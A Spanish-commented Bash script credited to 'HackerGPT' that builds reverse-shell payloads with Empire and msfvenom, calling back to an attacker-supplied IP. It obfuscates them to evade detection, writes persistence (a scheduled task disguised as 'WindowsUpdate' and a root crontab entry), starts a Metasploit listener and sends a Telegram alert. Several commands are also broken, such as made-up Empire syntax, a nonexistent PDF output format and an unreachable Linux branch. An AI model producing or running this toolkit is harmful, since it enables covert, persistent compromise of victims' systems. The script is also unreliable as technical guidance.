#!/bin/bash

# Autor: HackerGPT
# Script avanzado para generar payloads con evasión, persistencia y configuraciones especiales.

set -e  # Detener el script si ocurre un error

# Verificar si se ejecuta como root
if [[ $EUID -ne 0 ]]; then
    echo "Este script debe ejecutarse como root."
    exit 1
fi

# Solicitar datos básicos
echo "[+] Introduce la IP de tu máquina atacante (LHOST):"
read LHOST

if [[ ! "$LHOST" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo "IP no válida. Abortando..."
    exit 1
fi

LPORT=4444  # Puerto fijo

# Configuración inicial
WORK_DIR="$HOME/empire_advanced_payloads"
PAYLOAD_FILE="$WORK_DIR/payload.ps1"
OBFUSCATED_FILE="$WORK_DIR/obfuscated_payload.ps1"
mkdir -p "$WORK_DIR"

# Instalar dependencias necesarias
echo "[+] Instalando dependencias necesarias..."
apt update && apt install -y git python3 python3-pip libssl-dev libffi-dev build-essential metasploit-framework

# Instalar Empire
if [[ ! -d "$HOME/Empire" ]]; then
    echo "[+] Clonando e instalando Empire..."
    git clone https://github.com/EmpireProject/Empire.git "$HOME/Empire"
    cd "$HOME/Empire"
    pip3 install -r requirements.txt
fi

# Seleccionar tipo de payload
echo "[+] Selecciona el tipo de payload:"
echo "1) Meterpreter Reverse Shell"
echo "2) Reverse TCP Shell"
echo "3) PDF/Documento Malicioso con Payload"
echo "4) Payload con Rotación Aleatoria"
read -p "Opción: " PAYLOAD_TYPE

# Seleccionar notificaciones
echo "[+] ¿Quieres habilitar notificaciones en Telegram o Slack? (s/n)"
read -p "Respuesta: " NOTIFICATIONS

if [[ "$NOTIFICATIONS" == "s" ]]; then
    echo "[+] Configurando notificaciones en Telegram. Introduce tu Token y Chat ID."
    read -p "Token de Telegram: " TELEGRAM_TOKEN
    read -p "Chat ID de Telegram: " TELEGRAM_CHAT_ID
fi

# Iniciar Empire
echo "[+] Iniciando Empire..."
cd "$HOME/Empire"
python3 empire > /dev/null 2>&1 &
sleep 5

# Configurar listener en Empire
echo "[+] Configurando listener en Empire..."
python3 empire -c "
listeners
uset listener http
set Host $LHOST
set Port $LPORT
execute
"

# Generar payload según tipo seleccionado
if [[ "$PAYLOAD_TYPE" == "1" ]]; then
    echo "[+] Generando Meterpreter Reverse Shell para Windows..."
    python3 empire -c "
    uset module stager/http
    set Listener http
    set OutFile $PAYLOAD_FILE
    execute
    "
elif [[ "$PAYLOAD_TYPE" == "2" ]]; then
    echo "[+] Generando Reverse TCP Shell para Windows/Linux..."
    python3 empire -c "
    uset module stager/http
    set Listener http
    set OutFile $PAYLOAD_FILE.sh
    execute
    "
elif [[ "$PAYLOAD_TYPE" == "3" ]]; then
    echo "[+] Generando payload incrustado en PDF..."
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f pdf > "$WORK_DIR/payload.pdf"
elif [[ "$PAYLOAD_TYPE" == "4" ]]; then
    echo "[+] Generando payload con rotación aleatoria..."
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT --randomize-names -f exe > "$WORK_DIR/payload_random.exe"
fi

# Ofuscar payload para evitar detección
echo "[+] Ofuscando payload para evitar detección..."
python3 empire -c "
obfuscate powershell $PAYLOAD_FILE
execute
"
mv "$PAYLOAD_FILE.obfuscated" "$OBFUSCATED_FILE"

# Opcional: Agregar persistencia en Windows/Linux
echo "[+] ¿Deseas agregar persistencia al payload? (s/n)"
read -p "Respuesta: " PERSISTENCE

if [[ "$PERSISTENCE" == "s" ]]; then
    if [[ "$PAYLOAD_TYPE" == "1" || "$PAYLOAD_TYPE" == "2" ]]; then
        echo "[+] Configurando persistencia para Windows..."
        echo "schtasks /create /sc onstart /tn WindowsUpdate /tr 'powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\payload.ps1'" > "$WORK_DIR/persistence.bat"
    elif [[ "$PAYLOAD_TYPE" == "2" ]]; then
        echo "[+] Configurando persistencia para Linux..."
        echo "echo '@reboot root /bin/bash /path/to/payload.sh' >> /etc/crontab" > "$WORK_DIR/persistence.sh"
    fi
fi

# Configurar Metasploit
echo "[+] Configurando Metasploit para escuchar conexiones..."
msfconsole -qx "
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
run
"

# Notificaciones en Telegram
if [[ "$NOTIFICATIONS" == "s" ]]; then
    echo "[+] Enviando notificación de configuración completa..."
    curl -s -X POST https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage -d chat_id=$TELEGRAM_CHAT_ID -d text="El payload está listo. Escuchando conexiones en $LHOST:$LPORT."
fi

echo "[+] ¡Script completado! El payload está disponible en: $OBFUSCATED_FILE"
